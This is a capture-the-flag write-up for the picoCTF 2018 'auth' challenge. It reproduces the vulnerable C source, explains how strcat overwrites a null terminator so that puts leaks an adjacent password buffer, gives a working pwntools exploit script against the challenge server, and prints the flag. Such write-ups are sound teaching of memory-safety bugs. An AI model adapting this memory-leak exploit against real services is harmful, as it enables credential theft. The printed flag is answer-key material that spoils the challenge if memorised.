# Problem
Can you authenticate to this [service](https://2018shell1.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth) and get the flag? Connect with ```nc 2018shell1.picoctf.com 31045```. [Source](https://2018shell1.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth.c).

## Hints:
Are all the system calls being used safely?

Some people can have reallllllly long names you know..

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth
wget https://2018shell1.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```

Our goal is to pass ```if (!strcmp(password_input, password))``` and to call ```flag()```.

We can solve this in few ways:
* We can see that "password.txt" is relative, we can create such file in the home directory, and create soft link to the flag file. No need to leak/guess anything. **Edit: oh damn, we cant... the connection is via netcat**.
* The intended way, we can see that ```password``` comes in memory right after ```name```, if the name will be long enough, the ```strcat``` will override the terminating null, and the ```puts``` printing the name will print the password as well. We can alse see that the password won't change between executions.

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

if debug:
  p = process('./auth')
else:
  p = remote('2018shell1.picoctf.com', 31045)

print p.recvuntil('What is your name?')
p.sendline('A' * 250)
p.sendline('BBBB') # Dummy password
pw = p.recvall().split('\n')[2][256 - 250 - 2 :]

log.info('Leaked password: {}'.format(pw))

if debug:
  p = process('./auth')
else:
  p = remote('2018shell1.picoctf.com', 31045)

print p.recvuntil('What is your name?')
p.sendline('A')
print p.recvuntil('Please Enter the Password.')
log.info('Sending password: {}'.format(pw))
p.sendline(pw)

print p.recvall()
```

Flag: picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}